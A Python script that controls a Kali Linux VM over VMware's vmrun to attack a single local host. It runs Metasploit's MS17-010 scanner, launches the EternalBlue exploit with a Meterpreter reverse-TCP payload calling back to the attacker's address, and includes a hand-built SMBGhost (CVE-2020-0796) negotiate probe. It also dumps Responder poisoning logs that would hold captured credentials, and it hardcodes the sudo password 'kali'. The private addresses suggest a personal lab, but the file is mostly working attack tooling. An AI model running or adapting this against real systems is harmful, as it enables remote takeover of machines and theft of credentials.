#!/usr/bin/env python3
"""Step 11: Fix LLVM symlink + MSF + final MS17-010 + SMBGhost"""
import subprocess
import os

VMRUN = r'D:\software\vmware\tool\vmrun.exe'
VMX = r'E:\BaiduNetdiskDownload\kali-linux-2026.1-vmware-amd64.vmwarevm\kali-linux-2026.1-vmware-amd64.vmx'
TEMP = os.environ.get('TEMP', r'C:\Users\xianyv\AppData\Local\Temp')

def run_kali(cmd, timeout=120):
    script_path = os.path.join(TEMP, 'kali_cmd.sh')
    with open(script_path, 'w', encoding='utf-8', newline='\n') as f:
        f.write(f'#!/bin/bash\n{cmd}\n')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/kali_cmd.sh'],
                   capture_output=True, text=True, timeout=30)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'runProgramInGuest', VMX,
                    '/bin/bash', '-c',
                    f'chmod +x /tmp/kali_cmd.sh && timeout {timeout} /tmp/kali_cmd.sh > /tmp/kali_out.txt 2>&1'],
                   capture_output=True, text=True, timeout=timeout + 30)
    out_path = os.path.join(TEMP, 'kali_out.txt')
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromGuestToHost', VMX,
                    '/tmp/kali_out.txt', out_path],
                   capture_output=True, text=True, timeout=30)
    try:
        with open(out_path, 'r', encoding='utf-8', errors='ignore') as f:
            return f.read()
    except:
        return "[READ ERROR]"

# 1. Fix LLVM symlink loop
print("=" * 60)
print("[1] Fix LLVM symlink loop")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S bash -c '"
    "find /usr/lib/llvm-*/build -type l -name 'Debug+Asserts' -delete 2>/dev/null; "
    "rm -rf /usr/lib/llvm-*/build/Debug+Asserts/build 2>/dev/null; "
    "find /usr/lib/llvm-*/build -maxdepth 3 -type l -delete 2>/dev/null; "
    "echo FIXED'"
)
print(out)

# 2. Test MSF
print("\n" + "=" * 60)
print("[2] Test MSF")
print("=" * 60)
out = run_kali("echo kali | sudo -S msfconsole -v 2>&1 | head -5", timeout=60)
print(out)

# 3. If MSF works, run MS17-010
if "Framework Version" in out or "version" in out.lower() or "msf" in out.lower():
    print("\n" + "=" * 60)
    print("[3] MSF MS17-010 Scanner")
    print("=" * 60)
    out = run_kali(
        "echo kali | sudo -S msfconsole -q -x 'use auxiliary/scanner/smb/smb_ms17_010; set RHOSTS 192.168.233.129; run; exit' 2>&1 | tail -20",
        timeout=180
    )
    print(out)

    # 4. EternalBlue
    print("\n" + "=" * 60)
    print("[4] EternalBlue Exploit")
    print("=" * 60)
    out = run_kali(
        "echo kali | sudo -S msfconsole -q -x '"
        "use exploit/windows/smb/ms17_010_eternalblue; "
        "set RHOSTS 192.168.233.129; "
        "set LHOST 192.168.233.133; "
        "set LPORT 4444; "
        "set PAYLOAD windows/x64/meterpreter/reverse_tcp; "
        "run -j; "
        "sleep 30; "
        "sessions -l; "
        "exit' 2>&1 | tail -30",
        timeout=120
    )
    print(out)
else:
    # 5. Use nxc for SMBGhost check
    print("\n" + "=" * 60)
    print("[3] NXC CVE-2020-0796 check")
    print("=" * 60)
    out = run_kali(
        "nxc smb 192.168.233.129 -u '' -p '' -M ghostplus 2>&1 || "
        "nxc smb 192.168.233.129 -M ghostplus 2>&1 || "
        "echo 'Module not found'",
        timeout=30
    )
    print(out)
    
    # 6. Use Python for SMBGhost
    print("\n" + "=" * 60)
    print("[4] Python SMBGhost check")
    print("=" * 60)
    smbghost_py = '''#!/usr/bin/env python3
import socket
import struct

target = '192.168.233.129'

# SMB2 Negotiate with compression
pkt = bytes.fromhex(
    '00000128'  # NetBIOS length
    'fe534d42'  # SMB2 magic
    '4000'      # StructureSize
    '0000'      # CreditCharge
    '00000000'  # Status
    '0100'      # Command: Negotiate
    '1f00'      # CreditRequest
    '00000000'  # Flags
    '00000000'  # NextCommand
    '0100000000000000'  # MessageId
    '00000000'  # Reserved
    '00000000'  # TreeId
    '0000000000000000'  # SessionId
    '00000000000000000000000000000000'  # Signature
    '2400'      # StructureSize (36)
    '0500'      # DialectCount (5)
    '0100'      # SecurityMode
    '0000'      # Reserved
    '7f000000'  # Capabilities
    'ffffffffffffffff'  # ClientGuid
    '80010000'  # NegotiateContextOffset (384)
    '0200'      # NegotiateContextCount (2)
    '0000'      # Reserved
    '0202'      # 2.0.2
    '1002'      # 2.1
    '0003'      # 3.0
    '0203'      # 3.0.2
    '1103'      # 3.1.1
)
# Padding
pkt += b'\\x00' * 58
# Negotiate Context: SMB2_COMPRESSION_CAPABILITIES
pkt += bytes.fromhex(
    '0300'      # Type: SMB2_COMPRESSION_CAPABILITIES
    '0c00'      # DataLength (12)
    '00000000'  # Reserved
    '0300'      # CompressionAlgorithmCount (3)
    '0000'      # Padding
    '0100'      # Flags (1 = chained)
    '0000'      # Reserved
    '0100'      # LZNT1
    '0200'      # LZ77
    '0300'      # LZ77+Huffman
)
# Negotiate Context: SMB2_NETNAME
pkt += bytes.fromhex(
    '0500'      # Type
    '0400'      # DataLength
    '00000000'  # Reserved
    '00000000'  # Data
)

s = socket.socket()
s.settimeout(10)
try:
    s.connect((target, 445))
    s.send(pkt)
    resp = s.recv(4096)
    print(f"Response: {len(resp)} bytes")
    print(f"First 200 hex: {resp[:200].hex()}")
    
    # Check for compression in response
    if b'\\x03\\x00\\x0c\\x00' in resp:
        print("[!!!] VULNERABLE TO CVE-2020-0796 (SMBGhost)!")
        print("[!!!] Compression capabilities found in negotiate response!")
    else:
        print("[*] No compression - not vulnerable to SMBGhost")
    
    # Check dialect
    if len(resp) > 68:
        dialect = struct.unpack('<H', resp[68:70])[0]
        print(f"Selected dialect: {dialect:#06x}")
    
    s.close()
except Exception as e:
    print(f"Error: {e}")
'''
    script_path = os.path.join(TEMP, 'smbghost2.py')
    with open(script_path, 'w', encoding='utf-8') as f:
        f.write(smbghost_py)
    subprocess.run([VMRUN, '-T', 'ws', '-gu', 'kali', '-gp', 'kali',
                    'copyFileFromHostToGuest', VMX,
                    script_path, '/tmp/smbghost2.py'],
                   capture_output=True, text=True, timeout=30)
    out = run_kali("python3 /tmp/smbghost2.py", timeout=30)
    print(out)

# 7. Check responder logs
print("\n" + "=" * 60)
print("[5] Responder logs")
print("=" * 60)
out = run_kali(
    "echo kali | sudo -S bash -c 'cat /usr/share/responder/logs/Responder-Session.log 2>/dev/null; "
    "echo \"---\"; cat /usr/share/responder/logs/Poisoners-Session.log 2>/dev/null; "
    "echo \"---\"; ls -la /usr/share/responder/logs/ 2>/dev/null'",
    timeout=15
)
print(out)

print("\n" + "=" * 60)
print("FINAL SCAN COMPLETE")
print("=" * 60)
